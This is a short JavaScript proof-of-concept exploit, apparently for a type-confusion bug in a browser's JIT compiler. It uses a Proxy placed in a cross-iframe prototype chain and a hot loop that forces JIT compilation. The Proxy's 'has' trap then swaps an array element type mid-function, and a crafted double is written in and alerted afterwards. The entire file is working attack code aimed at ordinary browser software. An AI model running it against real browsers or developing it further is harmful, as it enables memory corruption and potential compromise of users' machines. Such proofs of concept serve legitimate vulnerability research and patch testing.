function opt(arr, arr2) {
    arr[1] = 1.1;

    let tmp = 0 in arr2;

    arr[0] = 2.3023e-320;

    return tmp;
}

function main() {
    let o = document.body.appendChild(document.createElement('iframe')).contentWindow;

    // Have a bad time
    o.eval(`
        let p = new Proxy({}, {});
        let a = {__proto__: {}};
        a.__proto__.__proto__ = p;
    `);

    let arr = [1.1, 2.2];
    let arr2 = [1.1, 2.2];

    let proto = new o.Object();
    let handler = {};

    arr2.__proto__ = proto;

    // Manipulating prototype chain with Proxy
    proto.__proto__ = new Proxy({}, {
        has() {
            arr[0] = {};  // Causing unexpected behavior by assigning an object to an array element

            return true;
        }
    });

    for (let i = 0; i < 10000; i++) {
        opt(arr, arr2);
    }

    // Triggering the vulnerability
    setTimeout(() => {
        delete arr2[0];  // Deleting an element in arr2

        opt(arr, arr2);  // Triggering the vulnerability

        alert(arr[0]);  // Alerting the manipulated value
    }, 500);
}

main();
